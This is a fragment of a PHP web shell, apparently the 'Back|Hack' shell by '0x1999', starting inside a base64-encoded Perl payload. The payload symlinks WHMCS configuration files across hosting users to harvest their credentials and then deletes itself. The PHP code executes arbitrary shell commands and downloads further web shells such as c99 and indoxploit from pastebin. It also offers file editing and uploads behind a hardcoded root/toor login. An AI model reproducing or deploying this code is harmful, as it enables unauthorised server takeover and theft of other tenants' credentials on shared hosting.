uJy9wdWJsaWNfaHRtbC93aG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITUMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG1jL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Ib3N0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlRFUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1N1cHBvcnRlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnRlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RvbWFpbnMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kb21haW4vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Ib3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSE9TVElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvc3Rpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DQVJUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2FydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NhcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PUkRFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvb3JkZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlRBUkVBL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGFyZWEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CSUxMSU5HL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CVVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CdXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9idXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NQU5BR0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9tYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlRTVVBQT1JUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50U3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudHN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0hFQ0tPVVQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DaGVja291dC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NoZWNrb3V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQkFTS0VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmFza2V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmFza2V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0VDVVJFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2VjdXJlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0FMRVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TYWxlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NhbGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUFVSQ0hBU0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9QdXJjaGFzZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3B1cmNoYXNlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQUNDT1VOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0FjY291bnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvVVNFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1VzZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC91c2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudHMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NeS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL215L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS93aG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BhbmVsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydC9vcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0NCik7DQpmb3JlYWNoIChAYXJyYXkpew0KCW15ICRjb25maWdueWEgPSAkXy0+e2NvbmZpZ2Rpcn07DQoJbXkgJHR5cGVjb25maWcgPSAkXy0+e3R5cGV9Ow0KCXN5bWxpbmsoIiRjb25maWdueWEiLCJiYWNraGFja19zeW0vJHVzZXJueWEtJHR5cGVjb25maWcudHh0Iik7DQoJbWtkaXIgImJhY2toYWNrX3N5bS8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiOw0KCXN5bWxpbmsoIiRjb25maWdueWEiLCJiYWNraGFja19zeW0vJHVzZXJueWEtJHR5cGVjb25maWcudHh0LzB4MTk5OS50eHQiKTsNCgljb3B5KCJiYWNraGFja19zeW0vbmVtdS50eHQiLCJiYWNraGFja19zeW0vJHVzZXJueWEtJHR5cGVjb25maWcudHh0Ly5odGFjY2VzcyIpIDsNCgl9DQp9DQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50ICI8aGVhZD48dGl0bGU+QnlwYXNzIDQwNCBCeSAweDE5OTk8L3RpdGxlPjwvaGVhZD4iOw0KcHJpbnQgJzxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjU7IHVybD1iYWNraGFja19zeW0iLz4nOw0KcHJpbnQgJzxib2R5PjxjZW50ZXI+PGgxPjB4MTk5OSBOZXZlciBEaWU8L2gxPic7DQpwcmludCAnPGEgaHJlZj0iYmFja2hhY2tfc3ltIj5LbGlrIERpc2luaTwvYT4nOw0KdW5saW5rKCQwKTs=";
			save("/tmp/symlink.pl", "w", base64_decode($sym['code']));
			system("perl /tmp/symlink.pl");
			sleep(1);
			@unlink("/tmp/symlink.pl");
			@unlink("passwd.txt");
			@unlink("backhack_sym/pas.txt");
			@unlink("backhack_sym/nemu.txt");
		}else{
		echo "<font color='lime'>[ok] symlink -> $dir/backhack_sym/";
		}
		echo "success -> $dir/backhack_sym/";
	}else{
	$cmd2=$cmd;
	if(preg_match('/ /',$cmd2)){$x=explode(' ',$cmd2);$cmd2=$x[0];}
	if(command_exist($cmd2)){
chdir($dir);
system($cmd);
}else{
echo "bash: ".htmlspecialchars($cmd2).": command not found";
}
}
}
}
function command_exist($cmd) {
    $return = shell_exec(sprintf("which %s", escapeshellarg($cmd)));
    return !empty($return);
}


function getfile($name) {
  if($name === "adminer") $get = array("https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php", "adminer.php");
  if($name === "indoxploit") $get = array("https://pastebin.com/raw/UJLd1DpM", "idx.php");
  if($name === "noname") $get = array("https://pastebin.com/raw/Pg3PnEir", "noname.php");
  if($name === "priv8") $get = array("https://pastebin.com/raw/7UM5eku8", "priv8.php");
  if($name === "c99") $get = array("https://pastebin.com/raw/hPzPr5A6", "c99.php");
    $fp = fopen($get[1], "w");
    $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $get[0]);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
          curl_setopt($ch, CURLOPT_FILE, $fp);
    return curl_exec($ch);
          curl_close($ch);
    fclose($fp);
    ob_flush();
    flush();
  }
function login(){
$='root';$auth='toor'; // Change me.
echo "Welcome to << Back|Hack GNU/Linux 2019.1 root/toor
[Parrot Style]
<form action='' method='POST'>
parrot login : <input type='text' name='login' style='color:white;font-weight:normal;'>
password : <input type='password' name='pwd' style='color:white;font-weight:normal;'>
<input type='submit' name='log' value=''>";
if(isset($_POST['log'])){
if($_POST['login'] == $user && $_POST['pwd'] == $auth){
$_SESSION['login'] = "$user";
pindah('?');
}else{
echo "login incorrect!\n";
}
}
}
if(!$_SESSION['login']){
login();
}else{
dashboard();
if(isset($_GET['save'])){
$save=$_GET['save'];
if($dir=="~"){$dir=getcwd();}
chdir($dir);
$x=explode(' ',$cmd);
$content=htmlspecialchars(file_get_contents($save));
echo "filename: $save
<textarea name='cont' rows=40 cols=100>$content</textarea>
<form action='' method='POST'><input type='submit' name='savez' value='save'>";
if(isset($_POST['savez'])){
$cont=$_POST['cont'];
$fh=fopen("$save",w);
fwrite($fh,"$cont");
if(fclose($fh)){echo "<script>alert('saved.');</script>";pindah("?dir=$dir");}else{echo "\n<script>alert('permission denied.');</script>\n";pindah("?dir=$dir");}
}
}
elseif(isset($_GET['upload'])){
chdir($dir);
echo "<form action='' method='POST' enctype='multipart/form-data'>
<input type='file' name='upload'><input type='submit' name='uploader' value='Upload'></form>";
if(isset($_POST['uploader'])){
if(@copy($_FILES['upload']['tmp_name'],$_FILES['upload']['name'])){
echo "<script>alert('success.');</script>";pindah("?dir=$dir");
}else{
echo "<script>alert('failed.');</script>";pindah("?dir=$dir");
}
}
}
}
?>
